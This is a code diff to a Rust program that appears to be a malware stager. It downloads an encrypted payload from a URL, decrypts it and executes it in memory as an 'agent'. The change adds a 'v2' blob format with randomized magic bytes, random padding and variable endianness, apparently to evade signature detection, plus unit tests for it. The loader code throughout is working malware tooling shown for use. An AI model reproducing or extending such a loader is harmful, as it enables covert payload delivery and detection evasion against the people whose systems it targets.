@@ -111,8 +111,8 @@ async fn main() -> Result<()> {
     let encrypted = download_with_retry(&cli.url, 3).await?;
     tracing::info!(bytes = encrypted.len(), "payload downloaded");
 
-    // Detect POLY wire format (magic "POLY" = 0x504F4C59).
-    let decrypted = if encrypted.starts_with(b"POLY") {
+    // Detect POLY wire format — either legacy (magic == b"POLY") or v2 (seed-derived magic).
+    let decrypted = if is_poly_blob(&encrypted) {
         poly_decrypt(&encrypted)?
     } else {
         let session = CryptoSession::from_shared_secret(&key_bytes);
@@ -125,32 +125,143 @@ async fn main() -> Result<()> {
     execute_in_memory(&decrypted, &cli.agent_args)
 }
 
-/// Decode and execute a POLY-format encrypted payload.
+/// Return `true` if `data` looks like a POLY-format blob (v1 or v2).
 ///
-/// Supports:
-/// - Scheme 0 (AesCtrStream): AES-256-CTR decryption
-/// - Scheme 2 (ChaCha20Stream): ChaCha20 decryption
-/// - Scheme 3 (RawStub): execute embedded x86_64 machine-code stub via
-///   mmap + mprotect on Linux x86_64
-fn poly_decrypt(data: &[u8]) -> Result<Vec<u8>> {
-    if data.len() < 9 {
-        anyhow::bail!("POLY blob too short");
+/// v1: first 4 bytes are `b"POLY"` (0x504f4c59).  
+/// v2: byte 4 (scheme) is one of {0, 2, 3}, flags byte (byte 5) encodes a
+/// padding length ≤ 16 in bits 2–7, and the total blob length is consistent
+/// with the declared key and ciphertext lengths.  The combined checks keep
+/// the false-positive rate against random AES-GCM payloads negligible.
+fn is_poly_blob(data: &[u8]) -> bool {
+    // v1 magic: unconditionally a POLY blob.
+    if data.starts_with(b"POLY") {
+        return true;
     }
-    // "POLY" + 1-byte scheme
+    // v2 heuristic: minimum header is 4 (magic) + 1 (scheme) + 1 (flags) = 6 bytes.
+    if data.len() < 6 {
+        return false;
+    }
     let scheme = data[4];
-    // key_len (BE u32) at offset 5
+    if !matches!(scheme, 0 | 2 | 3) {
+        return false;
+    }
+    let flags = data[5];
+    let pad_len = (flags >> 2) as usize;
+    // New-format spec: padding is capped at 16 bytes.
+    if pad_len > 16 {
+        return false;
+    }
+    // The blob must be long enough to contain at least the key_len field
+    // (4 bytes) after the header + padding.
+    let key_len_offset = 6 + pad_len;
+    if data.len() < key_len_offset + 4 {
+        return false;
+    }
+    // Validate key_len and ct_len fields are internally consistent.
+    let use_le = (flags & 1) != 0;
+    let decode_u32 = |b: &[u8]| -> u32 {
+        let arr: [u8; 4] = b.try_into().unwrap();
+        if use_le { u32::from_le_bytes(arr) } else { u32::from_be_bytes(arr) }
+    };
+    let key_len = decode_u32(&data[key_len_offset..key_len_offset + 4]) as usize;
+    let ct_len_offset = key_len_offset + 4 + key_len;
+    if data.len() < ct_len_offset + 4 {
+        return false;
+    }
+    let ct_len = decode_u32(&data[ct_len_offset..ct_len_offset + 4]) as usize;
+    data.len() >= ct_len_offset + 4 + ct_len
+}
+
+/// Top-level POLY blob dispatcher.  Detects v1 (legacy `b"POLY"` magic) vs
+/// v2 (randomized seed-derived magic with flags byte) and delegates.
+fn poly_decrypt(data: &[u8]) -> Result<Vec<u8>> {
+    if data.starts_with(b"POLY") {
+        poly_decrypt_legacy(data)
+    } else {
+        poly_decrypt_v2(data)
+    }
+}
+
+/// Decode and execute a legacy v1 POLY-format encrypted payload.
+///
+/// Wire format:
+/// ```text
+/// [4 bytes: "POLY"][1 byte: scheme][4 bytes BE: key_len]
+/// [key_len bytes: key][4 bytes BE: ct_len][ct_len bytes: ciphertext]
+/// ```
+fn poly_decrypt_legacy(data: &[u8]) -> Result<Vec<u8>> {
+    if data.len() < 9 {
+        anyhow::bail!("POLY v1 blob too short");
+    }
+    let scheme = data[4];
     let key_len = u32::from_be_bytes(data[5..9].try_into().unwrap()) as usize;
     if data.len() < 9 + key_len + 4 {
-        anyhow::bail!("POLY blob truncated in key field");
+        anyhow::bail!("POLY v1 blob truncated in key field");
     }
     let key = &data[9..9 + key_len];
     let ct_offset = 9 + key_len;
     let ct_len = u32::from_be_bytes(data[ct_offset..ct_offset + 4].try_into().unwrap()) as usize;
     if data.len() < ct_offset + 4 + ct_len {
-        anyhow::bail!("POLY blob truncated in ciphertext field");
+        anyhow::bail!("POLY v1 blob truncated in ciphertext field");
     }
     let ct = &data[ct_offset + 4..ct_offset + 4 + ct_len];
+    dispatch_scheme(scheme, ct, key)
+}
 
+/// Decode and execute a v2 POLY-format encrypted payload.
+///
+/// Wire format:
+/// ```text
+/// [4 bytes: seed-derived magic][1 byte: scheme][1 byte: flags]
+///     flags bit 0: endianness (0=BE, 1=LE)
+///     flags bit 1: padding present
+///     flags bits 2-7: padding byte count (0-16)
+/// [0..N bytes: random padding][4 bytes: key_len][key_len bytes: key]
+/// [4 bytes: ct_len][ct_len bytes: ciphertext]
+/// ```
+fn poly_decrypt_v2(data: &[u8]) -> Result<Vec<u8>> {
+    if data.len() < 6 {
+        anyhow::bail!("POLY v2 blob too short");
+    }
+    let scheme = data[4];
+    let flags = data[5];
+    let use_le = (flags & 1) != 0;
+    let has_padding = (flags & 2) != 0;
+    let pad_len = if has_padding { (flags >> 2) as usize } else { 0 };
+    if pad_len > 16 {
+        anyhow::bail!("POLY v2 flags: padding length {pad_len} exceeds maximum of 16");
+    }
+
+    let decode_u32 = |b: &[u8]| -> u32 {
+        let arr: [u8; 4] = b.try_into().unwrap();
+        if use_le { u32::from_le_bytes(arr) } else { u32::from_be_bytes(arr) }
+    };
+
+    let key_len_offset = 6 + pad_len;
+    if data.len() < key_len_offset + 4 {
+        anyhow::bail!("POLY v2 blob truncated before key_len field");
+    }
+    let key_len = decode_u32(&data[key_len_offset..key_len_offset + 4]) as usize;
+
+    let key_offset = key_len_offset + 4;
+    if data.len() < key_offset + key_len + 4 {
+        anyhow::bail!("POLY v2 blob truncated in key field");
+    }
+    let key = &data[key_offset..key_offset + key_len];
+
+    let ct_len_offset = key_offset + key_len;
+    let ct_len = decode_u32(&data[ct_len_offset..ct_len_offset + 4]) as usize;
+    let ct_offset = ct_len_offset + 4;
+    if data.len() < ct_offset + ct_len {
+        anyhow::bail!("POLY v2 blob truncated in ciphertext field");
+    }
+    let ct = &data[ct_offset..ct_offset + ct_len];
+
+    dispatch_scheme(scheme, ct, key)
+}
+
+/// Route to the correct decryption function for `scheme`.
+fn dispatch_scheme(scheme: u8, ct: &[u8], key: &[u8]) -> Result<Vec<u8>> {
     match scheme {
         0 => poly_decrypt_aes_ctr(ct, key),
         2 => poly_decrypt_chacha20(ct, key),
@@ -628,4 +739,120 @@ fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
     Err(anyhow!(
         "Unsupported platform for in-memory agent execution"
     ))
+}
+
+// ─── Unit tests ───────────────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Build a minimal v2 POLY blob for the given scheme, key, and ciphertext.
+    fn make_v2_blob(scheme: u8, use_le: bool, pad: &[u8], key: &[u8], ct: &[u8]) -> Vec<u8> {
+        let pad_len = pad.len() as u8;
+        let has_padding = pad_len > 0;
+        let flags: u8 = (use_le as u8) | ((has_padding as u8) << 1) | (pad_len << 2);
+
+        let encode_u32 = |v: u32| -> [u8; 4] {
+            if use_le { v.to_le_bytes() } else { v.to_be_bytes() }
+        };
+
+        let mut blob = Vec::new();
+        blob.extend_from_slice(b"\xAB\xCD\xEF\x01"); // arbitrary non-POLY magic
+        blob.push(scheme);
+        blob.push(flags);
+        blob.extend_from_slice(pad);
+        blob.extend_from_slice(&encode_u32(key.len() as u32));
+        blob.extend_from_slice(key);
+        blob.extend_from_slice(&encode_u32(ct.len() as u32));
+        blob.extend_from_slice(ct);
+        blob
+    }
+
+    #[test]
+    fn is_poly_blob_detects_legacy_magic() {
+        // Any blob starting with b"POLY" is recognised regardless of content.
+        assert!(is_poly_blob(b"POLY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"));
+        assert!(!is_poly_blob(b"NOPE\x00\x00\x00\x00\x00\x00\x00"));
+    }
+
+    #[test]
+    fn is_poly_blob_accepts_valid_v2() {
+        // Scheme 0, BE, no padding, 4-byte key, 1-byte ct.
+        let blob = make_v2_blob(0, false, &[], &[0u8; 4], &[0u8; 1]);
+        assert!(is_poly_blob(&blob));
+    }
+
+    #[test]
+    fn is_poly_blob_rejects_unknown_scheme() {
+        let mut blob = make_v2_blob(0, false, &[], &[0u8; 4], &[0u8; 1]);
+        blob[4] = 1; // scheme 1 is not defined
+        assert!(!is_poly_blob(&blob));
+    }
+
+    #[test]
+    fn is_poly_blob_rejects_excess_padding() {
+        // Embed pad_len = 17 in flags (bits 2-7): 17 << 2 = 68 | has_padding bit = 70
+        let flags: u8 = 1 /* has_padding */ << 1 | (17u8 << 2);
+        let mut blob = vec![0xAAu8, 0xBBu8, 0xCCu8, 0xDDu8, 0u8, flags];
+        blob.extend(vec![0u8; 30]); // enough padding
+        assert!(!is_poly_blob(&blob));
+    }
+
+    #[test]
+    fn poly_decrypt_v2_aes_ctr_scheme0_be() {
+        // Build a scheme-0 blob with a known key and verify decryption inverts encryption.
+        // AES key: 32 bytes; counter: 16 bytes of zeros → key material is 48 bytes.
+        let key = vec![0u8; 48];
+        let plaintext = b"hello poly v2 aes-ctr".to_vec();
+        let ct = aes256_ctr_xor(&plaintext, &key);
+
+        let blob = make_v2_blob(0, false, &[], &key, &ct);
+        let result = poly_decrypt_v2(&blob).expect("poly_decrypt_v2 scheme 0 BE failed");
+        assert_eq!(result, plaintext);
+    }
+
+    #[test]
+    fn poly_decrypt_v2_chacha20_scheme2_le() {
+        // Build a scheme-2 blob with LE length fields and 8 bytes of padding.
+        let key = vec![0u8; 44];
+        let plaintext = b"hello poly v2 chacha20 le padding".to_vec();
+        let ct = chacha20_xor(&plaintext, &key);
+
+        let pad = vec![0xCCu8; 8];
+        let blob = make_v2_blob(2, true, &pad, &key, &ct);
+        let result = poly_decrypt_v2(&blob).expect("poly_decrypt_v2 scheme 2 LE+padding failed");
+        assert_eq!(result, plaintext);
+    }
+
+    #[test]
+    fn poly_decrypt_legacy_scheme0_roundtrip() {
+        // Build a legacy v1 blob manually (b"POLY" + BE fields).
+        let key = vec![0u8; 48];
+        let plaintext = b"legacy poly v1".to_vec();
+        let ct = aes256_ctr_xor(&plaintext, &key);
+
+        let mut blob = Vec::new();
+        blob.extend_from_slice(b"POLY");
+        blob.push(0u8); // scheme AesCtrStream
+        blob.extend_from_slice(&(key.len() as u32).to_be_bytes());
+        blob.extend_from_slice(&key);
+        blob.extend_from_slice(&(ct.len() as u32).to_be_bytes());
+        blob.extend_from_slice(&ct);
+
+        let result = poly_decrypt(&blob).expect("poly_decrypt_legacy scheme 0 failed");
+        assert_eq!(result, plaintext);
+    }
+
+    #[test]
+    fn poly_decrypt_routes_to_v2_for_non_poly_magic() {
+        let key = vec![0u8; 44];
+        let plaintext = b"dispatcher v2 route test".to_vec();
+        let ct = chacha20_xor(&plaintext, &key);
+        let blob = make_v2_blob(2, false, &[], &key, &ct);
+
+        // poly_decrypt should route to v2 since magic != b"POLY".
+        let result = poly_decrypt(&blob).expect("dispatcher v2 route failed");
+        assert_eq!(result, plaintext);
+    }
 }
